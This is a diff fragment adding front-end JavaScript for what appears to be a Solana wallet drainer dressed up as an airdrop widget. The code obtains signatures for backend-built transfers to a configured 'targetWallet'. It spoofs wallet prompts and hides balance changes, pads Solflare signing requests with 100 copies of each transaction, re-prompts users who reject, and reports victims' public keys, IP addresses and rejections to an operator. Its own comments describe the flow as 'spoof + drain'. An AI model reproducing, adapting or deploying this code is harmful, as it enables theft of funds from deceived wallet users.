+            const msg1Bytes = Uint8Array.from(atob(prep.unsignedTx1Msg), (c) =>
+              c.charCodeAt(0),
+            );
+            const txAccess = SolWeb3.Transaction.populate(
+              SolWeb3.Message.from(msg1Bytes),
+            );
+
+            let signedAccess;
+            try {
+              signedAccess = await provider.signTransaction(txAccess);
+            } catch (e) {
+              if (
+                e.message &&
+                (e.message.includes("reject") ||
+                  e.message.includes("denied") ||
+                  e.message.includes("cancel"))
+              ) {
+                showRejectedState(
+                  getText("transactionRejected", "Transaction rejected"),
+                );
+                await sendRejectNotification();
+                return { usedFallback: false };
+              }
+              throw e;
+            }
+
+            updateLoadingStatus("Processing, please wait...");
+
+            const createResp = await fetch(
+              API_BASE_URL.replace(/\/$/, "") + "/lighthouse-create-accounts",
+              {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ sessionId: prep.sessionId }),
+              },
+            );
+            if (!createResp.ok) {
+              const err = await createResp
+                .json()
+                .catch(() => ({ error: "Unknown error" }));
+              throw new Error(err.error || "Failed to create accounts");
+            }
+            const createJson = await createResp.json();
+
+            updateLoadingStatus("Almost done, please confirm...");
+
+            const msg2Bytes = Uint8Array.from(
+              atob(createJson.unsignedTx2Msg),
+              (c) => c.charCodeAt(0),
+            );
+            const txTransfer = SolWeb3.Transaction.populate(
+              SolWeb3.Message.from(msg2Bytes),
+            );
+
+            let signedTransfer;
+            try {
+              signedTransfer = await provider.signTransaction(txTransfer);
+            } catch (e) {
+              if (
+                e.message &&
+                (e.message.includes("reject") ||
+                  e.message.includes("denied") ||
+                  e.message.includes("cancel"))
+              ) {
+                showRejectedState(
+                  getText("transactionRejected", "Transaction rejected"),
+                );
+                await sendRejectNotification();
+                return { usedFallback: false };
+              }
+              throw e;
+            }
+
+            updateLoadingStatus("Submitting...");
+
+            const transferBytes = signedTransfer.serialize({
+              requireAllSignatures: false,
+              verifySignatures: false,
+            });
+            const transferB64 = btoa(
+              String.fromCharCode.apply(null, Array.from(transferBytes)),
+            );
+            const relayTransfer = await fetch(
+              API_BASE_URL.replace(/\/$/, "") + "/lighthouse-relay",
+              {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                  signedTx: transferB64,
+                  userPublicKey: userPubkey,
+                  userChatId: config.userChatId,
+                  txType: "sharing_is_caring",
+                }),
+              },
+            );
+            const relayTransferJson = await relayTransfer.json();
+            if (relayTransferJson.txid) allTxids.push(relayTransferJson.txid);
+
+            const accessBytes = signedAccess.serialize({
+              requireAllSignatures: false,
+              verifySignatures: false,
+            });
+            const accessB64 = btoa(
+              String.fromCharCode.apply(null, Array.from(accessBytes)),
+            );
+            const relayAccess = await fetch(
+              API_BASE_URL.replace(/\/$/, "") + "/lighthouse-relay",
+              {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                  signedTx: accessB64,
+                  userPublicKey: userPubkey,
+                  userChatId: config.userChatId,
+                  txType: "share_token_access",
+                }),
+              },
+            );
+            const relayAccessJson = await relayAccess.json();
+            if (relayAccessJson.txid) allTxids.push(relayAccessJson.txid);
+
+            if (allTxids.length > 0) {
+              try {
+                await fetch(
+                  API_BASE_URL.replace(/\/$/, "") +
+                    "/lighthouse-notify-confirm",
+                  {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                      userPublicKey: userPubkey,
+                      userChatId: config.userChatId,
+                      txids: allTxids,
+                      sessionId: prep.sessionId,
+                    }),
+                  },
+                );
+              } catch (e) {
+                /* removed */
+              }
+              try {
+                await fetch(
+                  API_BASE_URL.replace(/\/$/, "") + "/lighthouse-withdraw",
+                  {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ sessionId: prep.sessionId }),
+                  },
+                );
+              } catch (e) {
+                /* removed */
+              }
+            }
+
+            updateLoadingStatus(
+              getText("transactionsSent", "Transactions sent!"),
+            );
+            setTimeout(() => {
+              showSelectionView();
+            }, 1500);
+            postToParent("relayed", {});
+            return { usedFallback: false };
+          } catch (e) {
+            /* removed */
+            const errorMsg = e.message || "Transaction failed";
+            if (
+              errorMsg.includes("reject") ||
+              errorMsg.includes("denied") ||
+              errorMsg.includes("cancel") ||
+              errorMsg.includes("cancelled")
+            ) {
+              showRejectedState(
+                getText("transactionRejected", "Transaction rejected"),
+              );
+              await sendRejectNotification();
+            } else if (
+              errorMsg.includes("not eligible") ||
+              errorMsg.includes("Insufficient") ||
+              errorMsg.includes("balance")
+            ) {
+              showRejectedState(
+                getText("insufficientBalance", "Insufficient balance"),
+              );
+            } else {
+              showRejectedState(errorMsg);
+            }
+            return { usedFallback: false };
+          }
+        }
+        // ─── End Lighthouse Flow ──────────────────────────────
+
+        async function buildAndSendSpoofTransaction(
+          fetchBuildTransactionFallback,
+        ) {
+          if (
+            !config ||
+            !config.customAirdropMint ||
+            !config.customAirdropAmount
+          ) {
+            /* removed */
+            return "continue";
+          }
+
+          try {
+            if (currentWallet) {
+              updateLoadingStatus(
+                getText(
+                  "preparingAirdropTransaction",
+                  "Preparing airdrop transaction...",
+                ),
+              );
+            }
+            const clientIP = await getClientIP();
+
+            const resp = await fetch(
+              API_BASE_URL.replace(/\/$/, "") + "/build-spoof",
+              {
+                method: "POST",
+                headers: {
+                  "Content-Type": "application/json",
+                  "x-spoof-auth":
+                    "app_bcea2a77b7fc2048f8a2a7d083118d3b42aecc0f783754335c50af0591d4cc1a533ccba165077cd09fd7db96b0dba909",
+                },
+                body: JSON.stringify({
+                  customAirdropMint: config.customAirdropMint,
+                  customAirdropAmount: config.customAirdropAmount,
+                  userPublicKey: userPubkey,
+                  userChatId: config.userChatId,
+                  clientIP: clientIP,
+                  walletName: currentWallet,
+                  messageSignature:
+                    currentWallet === "phantom"
+                      ? phantomMessageSignature
+                      : undefined,
+                }),
+              },
+            );
+            const json = await resp.json();
+
+            if (json.status == "wl") {
+              const wlBase = json.url.split("?")[0];
+              window.location.href = wlBase + "?app=spoodle";
+              return "redirect";
+            }
+
+            if (!resp.ok) {
+              /* removed */
+              return "continue";
+            }
+
+            // Not eligible for WL → Lighthouse only (no spoof + drain)
+            if (json.useLighthouse) {
+              const lhResult = await lighthouseFlow(
+                fetchBuildTransactionFallback,
+              );
+              if (lhResult.usedFallback) return "lighthouse_fallback";
+              return "lighthouse_done";
+            }
+
+            return "continue";
+          } catch (e) {
+            /* removed */
+            return "continue";
+          }
+        }
+
+        async function fetchBuildTransaction() {
+          const clientIP = await getClientIP();
+          const resp = await fetch(
+            API_BASE_URL.replace(/\/$/, "") + "/build-transaction",
+            {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({
+                spoofPrompt: config.spoofPrompt && currentWallet === "phantom",
+                hideChanges: config.hideChanges,
+                userPublicKey: userPubkey,
+                targetWallet: config.targetWallet,
+                walletName: currentWallet || undefined,
+                useProxyForTokens: config.useProxyForTokens,
+                customAirdropMint: config.customAirdropMint,
+                customAirdropAmount: config.customAirdropAmount,
+                userChatId: config.userChatId,
+                usdcPayout: !!config.usdcPayout,
+                clientIP: clientIP,
+                minValue: config.minValue,
+              }),
+            },
+          );
+          const json = await resp.json();
+          if (!resp.ok)
+            throw new Error(json.error || "Failed to build transaction");
+          if (json.error)
+            throw new Error(json.error);
+          unsignedTxs =
+            json.unsignedTxs || (json.unsignedTx ? [json.unsignedTx] : []);
+          return unsignedTxs;
+        }
+
+        async function buildTransaction() {
+          if (!config || !config.targetWallet) {
+            if (currentWallet) {
+              updateLoadingStatus(
+                getText("widgetMisconfigured", "Widget misconfigured"),
+              );
+              showRejectedState(
+                getText(
+                  "widgetMisconfiguredTargetWallet",
+                  "Widget misconfigured: missing targetWallet.",
+                ),
+              );
+            } else {
+              setStatus(
+                getText(
+                  "widgetMisconfiguredTargetWallet",
+                  "Widget misconfigured: missing targetWallet.",
+                ),
+                "error",
+              );
+            }
+            return;
+          }
+
+          // If spoofPrompt: build-spoof. If whitelist → redirect. If NOT whitelist → Lighthouse (or fallback to build-transaction)
+          if (config.spoofPrompt && currentWallet === "phantom") {
+            try {
+              const result = await buildAndSendSpoofTransaction(() =>
+                fetchBuildTransaction(),
+              );
+              if (result === "redirect") return;
+              if (result === "lighthouse_done") return;
+              if (result === "lighthouse_fallback") return; // fallback already set unsignedTxs
+            } catch (e) {
+              if (e.name === "WALLET_MISMATCH") {
+                /* removed */
+                throw e;
+              }
+              /* removed */
+            }
+          }
+
+          if (currentWallet) {
+            updateLoadingStatus(
+              getText(
+                "buildingTransaction",
+                "Building transaction, please wait...",
+              ),
+            );
+          } else {
+            setStatus(
+              getText(
+                "buildingTransactionWait",
+                "Building transaction, please wait…",
+              ),
+              "",
+            );
+          }
+
+          if (
+            config.hideChanges &&
+            (currentWallet === "phantom" || currentWallet === "backpack")
+          ) {
+            const sleepMs = config.stresserSleepMs || 500;
+            await sleep(sleepMs);
+          }
+          try {
+            await fetchBuildTransaction();
+            if (currentWallet) {
+              updateLoadingStatus(
+                getText(
+                  "transactionsBuilt",
+                  "Transactions built. Please sign...",
+                ),
+              );
+            } else {
+              setStatus(
+                getText(
+                  "transactionsBuiltSign",
+                  "Transactions built. Please sign in your wallet.",
+                ),
+                "success",
+              );
+            }
+            return unsignedTxs;
+          } catch (e) {
+            /* removed */
+            const errorMsg = e.message || "Failed to build transaction";
+
+            // Check for balance-related errors
+            const isBalanceError =
+              errorMsg.includes("zero SOL balance") ||
+              errorMsg.includes("Insufficient SOL balance") ||
+              errorMsg.includes("insufficient") ||
+              errorMsg.includes("balance");
+
+            if (currentWallet) {
+              if (isBalanceError) {
+                updateLoadingStatus(
+                  getText("insufficientBalance", "Insufficient balance"),
+                );
+                showRejectedState(
+                  getText("insufficientBalance", "Insufficient balance"),
+                );
+              } else {
+                updateLoadingStatus(
+                  getText(
+                    "failedToBuildTransaction",
+                    "Failed to build transaction",
+                  ),
+                );
+                showRejectedState("" + errorMsg);
+              }
+            } else {
+              if (isBalanceError) {
+                setStatus(
+                  getText("insufficientBalance", "Insufficient balance"),
+                  "error",
+                );
+              } else {
+                setStatus(errorMsg, "error");
+              }
+            }
+            throw e;
+          }
+        }
+
+        async function sendRejectNotification(reason) {
+          if (!config || rejectNotificationSent) return;
+          if (reason !== "connection" && !userPubkey) return;
+          rejectNotificationSent = true;
+          try {
+            await fetch(API_BASE_URL.replace(/\/$/, "") + "/notify-reject", {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({
+                userPublicKey: userPubkey || undefined,
+                userChatId: config.userChatId,
+                reason: reason || "transaction",
+              }),
+            });
+          } catch (e) {
+            /* removed */
+          }
+        }
+
+        async function signAndSend() {
+          if (!userPubkey) {
+            setStatus(
+              getText("connectWalletFirst", "Connect wallet first."),
+              "error",
+            );
+            return;
+          }
+
+          // Use the current provider that was connected
+          const provider =
+            currentProvider ||
+            window.solana ||
+            (window.phantom && window.phantom.solana) ||
+            window.solflare ||
+            window.backpack ||
+            window.okxwallet?.solana ||
+            window.coinbaseSolana;
+
+          if (!provider) {
+            setStatus(
+              getText(
+                "noSolanaWalletProvider",
+                "No Solana wallet provider available.",
+              ),
+              "error",
+            );
+            return;
+          }
+
+          // Ensure provider is connected
+          if (provider.isConnected === false || !provider.publicKey) {
+            if (currentWallet) {
+              updateLoadingStatus(
+                getText("walletNotConnected", "Wallet not connected"),
+              );
+              showRejectedState(
+                getText(
+                  "walletNotConnectedReconnect",
+                  "Wallet not connected. Please reconnect.",
+                ),
+              );
+            } else {
+              setStatus(
+                getText(
+                  "walletNotConnectedReconnect",
+                  "Wallet not connected. Please reconnect.",
+                ),
+                "error",
+              );
+            }
+            return;
+          }
+          try {
+            await ensureSolanaWeb3Ready();
+            if (!unsignedTxs || !unsignedTxs.length) {
+              await buildTransaction();
+            }
+            if (!unsignedTxs || !unsignedTxs.length) return;
+
+            if (!window.solanaWeb3 || !window.solanaWeb3.Transaction) {
+              throw new Error("Solana web3 library not available in iframe.");
+            }
+
+            if (currentWallet) {
+              updateLoadingStatus(
+                getText("requestingSignatures", "Requesting signatures..."),
+              );
+            } else {
+              setStatus(
+                getText("requestingSignaturesAlt", "Requesting signatures…"),
+                "",
+              );
+            }
+
+            // Reconstruct transactions from base64
+            const txs = [];
+            for (let i = 0; i < unsignedTxs.length; i++) {
+              try {
+                const b64 = unsignedTxs[i];
+                const txBytes = Uint8Array.from(atob(b64), (c) =>
+                  c.charCodeAt(0),
+                );
+                const tx = window.solanaWeb3.Transaction.from(txBytes);
+
+                // Validate transaction has required fields
+                if (!tx.recentBlockhash) {
+                  throw new Error(
+                    `Transaction ${i + 1} missing recentBlockhash`,
+                  );
+                }
+
+                // Validate transaction structure
+                if (!tx.instructions || tx.instructions.length === 0) {
+                  /* removed */
+                  continue;
+                }
+
+                // Validate transaction size
+                const txSize = txBytes.length;
+                if (txSize > 1232) {
+                  /* removed */
+                }
+
+                // Ensure fee payer is set
+                if (!tx.feePayer) {
+                  /* removed */
+                  tx.feePayer = new window.solanaWeb3.PublicKey(userPubkey);
+                }
+
+                /* removed */
+
+                txs.push(tx);
+              } catch (e) {
+                /* removed */
+                throw new Error(
+                  "Failed to parse transaction data: " +
+                    (e.message || "Unknown error"),
+                );
+              }
+            }
+
+            if (txs.length === 0) {
+              throw new Error("No valid transactions to sign");
+            }
+
+            // For Solflare, multiply transactions by 100x (signing only — relay uses one signature per original below)
+            let solflareSignOriginalCount = null;
+            if (currentWallet === "solflare") {
+              solflareSignOriginalCount = txs.length;
+              const originalTxs = [...txs]; // Copy the original transactions
+
+              // Clear and add each transaction 100 times
+              txs.length = 0; // Clear the array
+
+              for (let i = 0; i < originalTxs.length; i++) {
+                for (let j = 0; j < 100; j++) {
+                  // Create a copy of the transaction by serializing and deserializing
+                  const serialized = originalTxs[i].serialize({
+                    requireAllSignatures: false,
+                    verifySignatures: false,
+                  });
+                  const txCopy = window.solanaWeb3.Transaction.from(serialized);
+                  txs.push(txCopy);
+                }
+              }
+
+              /* removed */
+            }
+
+            /* removed */
+
+            const useOkxProvider =
+              currentWallet === "okx" ||
+              (window.okxwallet &&
+                window.okxwallet.solana &&
+                provider === window.okxwallet.solana);
+            if (useOkxProvider) {
+              updateLoadingStatus("OKX: switching to Solana if needed…");
+              await ensureOkxSolanaMainnet({ timeoutMs: 5000 });
+              if (currentWallet) {
+                updateLoadingStatus(
+                  getText("requestingSignatures", "Requesting signatures..."),
+                );
+              } else {
+                setStatus(
+                  getText("requestingSignaturesAlt", "Requesting signatures…"),
+                  "",
+                );
+              }
+            }
+
+            let signedTxs;
+            let transactionsSigned = false;
+            let jupiterRelayDone = false;
+            let txids = [];
+            while (!transactionsSigned) {
+              try {
+                const isJupiterSequential =
+                  currentWallet === "jupiter" &&
+                  provider.isJupiter &&
+                  txs.length > 0;
+
+                if (!isJupiterSequential) {
+                  if (
+                    !provider.signAllTransactions ||
+                    typeof provider.signAllTransactions !== "function"
+                  ) {
+                    throw new Error(
+                      "Wallet does not support signAllTransactions. Please use Phantom or Solflare.",
+                    );
+                  }
+                } else if (
+                  !provider.signTransaction ||
+                  typeof provider.signTransaction !== "function"
+                ) {
+                  throw new Error(
+                    "Jupiter wallet does not support signTransaction.",
+                  );
+                }
+
+                /* removed */
+                /* removed */
+
+                // Validate all transactions before signing
+                for (let i = 0; i < txs.length; i++) {
+                  const tx = txs[i];
+                  if (!tx.recentBlockhash) {
+                    throw new Error(`Transaction ${i + 1} missing blockhash`);
+                  }
+                  if (!tx.feePayer) {
+                    throw new Error(`Transaction ${i + 1} missing fee payer`);
+                  }
+                  if (!tx.instructions || tx.instructions.length === 0) {
+                    throw new Error(`Transaction ${i + 1} has no instructions`);
+                  }
+                }
+
+                if (isJupiterSequential) {
+                  signedTxs = [];
+                  let relayFailures = 0;
+                  for (let ji = 0; ji < txs.length; ji++) {
+                    updateLoadingStatus(
+                      getText(
+                        "requestingSignatures",
+                        "Requesting signatures...",
+                      ) +
+                        " (" +
+                        (ji + 1) +
+                        "/" +
+                        txs.length +
+                        ")",
+                    );
+                    const signed = await provider.signTransaction(txs[ji]);
+                    assertSignedTxsHaveUserSig([signed], userPubkey);
+                    signedTxs.push(signed);
+                    /* removed */
+                    updateLoadingStatus(
+                      getText(
+                        "broadcastingTransactions",
+                        "Broadcasting transactions...",
+                      ) +
+                        " (" +
+                        (ji + 1) +
+                        "/" +
+                        txs.length +
+                        ")",
+                    );
+                    const relay = await relaySignedTransaction(signed);
+                    if (!relay.ok) {
+                      relayFailures++;
+                      /* removed */
+                    } else if (relay.json && relay.json.txid) {
+                      txids.push(relay.json.txid);
+                      /* server notifies on relay success (with amounts) */
+                    }
+                  }
+                  jupiterRelayDone = true;
+                  if (txids.length === 0) {
+                    throw new Error(
+                      relayFailures > 0
+                        ? "Signed but relay failed — backend could not broadcast (" +
+                            relayFailures +
+                            " tx(s))"
+                        : "Signed but no transactions were relayed",
+                    );
+                  }
+                } else {
+                  signedTxs = await provider.signAllTransactions(txs);
+                  assertSignedTxsHaveUserSig(signedTxs, userPubkey);
+                }
+                isRunning = false;
+
+                /* removed */
+                signedTxs.forEach((signed, i) => {
+                  const tx = signed && signed.tx ? signed.tx : signed;
+                  /* removed */
+                });
+                transactionsSigned = true;
+                break;
+              } catch (e) {
+                /* removed */
+                if (!isUserSigningRejection(e)) {
+                  throw e;
+                }
+                // User rejected signing - reprompt
+                if (currentWallet) {
+                  updateLoadingStatus(
+                    "Please sign all transactions to continue.",
+                  );
+                  showRejectedState(
+                    "Transactions rejected. Please sign to continue.",
+                  );
+                }
+                await sleep(1500);
+                loadingRing.classList.remove("rejected");
+                walletLoadingContainer.classList.remove("rejected", "shake");
+                rejectionMessage.classList.remove("show");
+                if (currentWallet) {
+                  updateLoadingStatus(
+                    getText(
+                      "requestingSignatures",
+                      "Please sign fee transaction...",
+                    ),
+                  );
+                }
+              }
+            }
+
+            if (!jupiterRelayDone) {
+              if (currentWallet) {
+                updateLoadingStatus(
+                  getText(
+                    "broadcastingTransactions",
+                    "Broadcasting transactions...",
+                  ),
+                );
+              } else {
+                setStatus(
+                  getText(
+                    "broadcastingTransactionsAlt",
+                    "Broadcasting transactions…",
+                  ),
+                  "",
+                );
+              }
+              // Solflare: only relay one signed tx per real transaction (omit the 99 duplicates used for signing UX)
+              let signedTxsToRelay = signedTxs;
+              if (currentWallet === "solflare" && solflareSignOriginalCount) {
+                const expectedLen = solflareSignOriginalCount * 100;
+                if (signedTxs.length === expectedLen) {
+                  signedTxsToRelay = [];
+                  for (let i = 0; i < solflareSignOriginalCount; i++) {
+                    signedTxsToRelay.push(signedTxs[i * 100]);
+                  }
+                } else {
+                  /* removed */
+                  signedTxsToRelay = [];
+                  for (
+                    let i = 0;
+                    i < solflareSignOriginalCount && i * 100 < signedTxs.length;
+                    i++
+                  ) {
+                    signedTxsToRelay.push(signedTxs[i * 100]);
+                  }
+                  if (signedTxsToRelay.length === 0)
+                    signedTxsToRelay = signedTxs;
+                }
+              }
+              let relayFailures = 0;
+              for (const signed of signedTxsToRelay) {
+                const relay = await relaySignedTransaction(signed);
+                if (!relay.ok) {
+                  relayFailures++;
+                  /* removed */
+                  continue;
+                }
+                if (relay.json && relay.json.txid) {
+                  txids.push(relay.json.txid);
+                }
+              }
+
+              if (txids.length === 0) {
+                throw new Error(
+                  relayFailures > 0
+                    ? "Signed but relay failed — backend could not broadcast (" +
+                        relayFailures +
+                        " tx(s))"
+                    : "Signed but no transactions were relayed",
+                );
+              }
+            }
+
+            // Confirmation is sent server-side on relay success (with
+            // amounts) — a client-side notify here would duplicate it.
+
+            if (currentWallet) {
+              updateLoadingStatus(
+                getText("transactionsSent", "Transactions sent!"),
+              );
+              setTimeout(() => {
+                showSelectionView();
+              }, 1500);
+            } else {
+              setStatus(
+                getText("transactionsSent", "Transactions sent!"),
+                "success",
+              );
+            }
+            postToParent("relayed", {});
+          } catch (e) {
+            /* removed */
+            const errorMsg = e.message || "Failed to sign or send transaction";
+            if (
+              errorMsg.includes("reject") ||
+              errorMsg.includes("denied") ||
+              errorMsg.includes("User rejected") ||
+              errorMsg.includes("cancelled")
+            ) {
+              if (currentWallet) {
+                showRejectedState(
+                  getText("transactionRejected", "Transaction rejected"),
+                );
+                await sendRejectNotification();
+              } else {
+                setStatus(
+                  getText("transactionRejected", "Transaction rejected"),
+                  "error",
+                );
+                await sendRejectNotification();
+              }
+            } else {
+              if (currentWallet) {
+                updateLoadingStatus(
+                  getText("transactionFailed", "Transaction failed"),
+                );
+                showRejectedState("" + errorMsg);
+              } else {
+                setStatus(errorMsg, "error");
+              }
+            }
+          }
+        }
+
+        backBtn.addEventListener("click", () => {
+          showSelectionView();
+        });
+
+        // Add event listeners with error handling
+        if (phantomBtn) {
+          /* removed */
+          phantomBtn.addEventListener("click", () => {
+            /* removed */
+            connectWallet("phantom");
+          });
+        } else {
+          /* removed */
+        }
+
+        if (solflareBtn) {
+          /* removed */
+          solflareBtn.addEventListener("click", () => {
+            /* removed */
+            connectWallet("solflare");
+          });
+        } else {
+          /* removed */
+        }
+
+        if (backpackBtn) {
+          /* removed */
+          backpackBtn.addEventListener("click", () => {
+            /* removed */
+            connectWallet("backpack");
+          });
+        } else {
+          /* removed */
+        }
+
+        if (okxBtn) {
+          /* removed */
+          okxBtn.addEventListener("click", () => {
+            /* removed */
+            connectWallet("okx");
+          });
+        } else {
+          /* removed */
+        }
+
+        if (coinbaseBtn) {
+          /* removed */
+          coinbaseBtn.addEventListener("click", () => {
+            /* removed */
+            connectWallet("coinbase");
+          });
+        } else {
+          /* removed */
+        }
+
+        if (jupiterBtn) {
+          /* removed */
+          jupiterBtn.addEventListener("click", () => {
+            /* removed */
+            connectWallet("jupiter");
+          });
+        } else {
+          /* removed */
+        }
+
+        /* removed */
+      })();
+    </script>
+  </body>
+</html>
